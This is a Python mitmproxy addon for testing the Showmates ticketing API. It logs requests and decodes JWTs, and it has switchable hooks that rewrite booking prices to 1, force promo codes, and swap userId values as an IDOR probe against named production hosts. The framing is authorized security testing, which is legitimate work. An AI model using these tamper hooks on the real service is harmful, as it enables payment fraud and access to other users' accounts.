"""
mitmproxy addon for Showmates API testing.

Run:  mitmdump -s showmates_mitm.py --listen-port 8080
  or:  mitmweb  -s showmates_mitm.py --listen-port 8080   (web UI at http://127.0.0.1:8081)

What it does:
  * Flags and pretty-logs every request to the Showmates backend (prod / staging / dev).
  * Decodes Bearer JWT headers so you can see the claims you're sending.
  * Provides ready-to-enable TAMPER hooks for the key test cases from docs/08 §8.7
    (price tamper, promo, IDOR probing). All tampering is OFF by default — flip the
    flags at the top to arm one.

These apps send plain JSON over TLS (no app-layer encryption — see docs/08 §8.8),
so once the device trusts your CA (or you run the Flutter TLS-bypass), everything
here is readable and editable.
"""
import json
import base64
from mitmproxy import http, ctx

# Hosts that belong to the Showmates backend (prod, staging, local dev seen in the app).
API_HOSTS = ("showmates.in", "staging.showmates.in", "seller.showmates.in", "172.20.10.2")

# ---- TAMPER SWITCHES (default OFF). Arm one at a time for a specific test. ----
TAMPER_PRICE      = False   # rewrite amount/subTotal/payableAmount in book-ticket -> 1
TAMPER_PROMO      = False   # force a promo code into book-ticket requests
FORCE_USER_ID     = None    # e.g. "123" to swap your userId in paths/bodies (IDOR probe)
LOG_BODIES        = True    # log request/response JSON bodies for API hosts


def _is_api(flow: http.HTTPFlow) -> bool:
    return any(h in flow.request.pretty_host for h in API_HOSTS)


def _decode_jwt(auth: str):
    try:
        tok = auth.split(" ", 1)[1] if " " in auth else auth
        payload = tok.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return None


def request(flow: http.HTTPFlow):
    if not _is_api(flow):
        return
    r = flow.request
    ctx.log.info(f"\n>>> {r.method} {r.pretty_url}")

    auth = r.headers.get("Authorization", "")
    if auth:
        claims = _decode_jwt(auth)
        ctx.log.info(f"    JWT claims: {claims}" if claims else "    Authorization: (opaque)")

    body = None
    if LOG_BODIES and r.content:
        try:
            body = json.loads(r.get_text())
            ctx.log.info(f"    body: {json.dumps(body)[:1500]}")
        except Exception:
            ctx.log.info(f"    body(raw {len(r.content)}B)")

    changed = False
    if isinstance(body, dict):
        if TAMPER_PRICE and ("book-ticket" in r.path or "process-order" in r.path):
            for k in ("amount", "subTotal", "totalPrice", "payableAmount", "baseAmount"):
                if k in body:
                    ctx.log.alert(f"    TAMPER price {k}: {body[k]} -> 1")
                    body[k] = 1
                    changed = True
        if TAMPER_PROMO and "book-ticket" in r.path:
            body["promocode"] = TAMPER_PROMO if isinstance(TAMPER_PROMO, str) else "TESTCODE"
            changed = True
        if FORCE_USER_ID and "userId" in body:
            ctx.log.alert(f"    IDOR swap userId {body['userId']} -> {FORCE_USER_ID}")
            body["userId"] = FORCE_USER_ID
            changed = True
        if changed:
            r.set_text(json.dumps(body))


def response(flow: http.HTTPFlow):
    if not _is_api(flow) or not LOG_BODIES:
        return
    resp = flow.response
    if resp and resp.content and "json" in resp.headers.get("content-type", ""):
        try:
            data = resp.get_text()
            ctx.log.info(f"<<< {resp.status_code} {flow.request.path}  {data[:1200]}")
        except Exception:
            pass
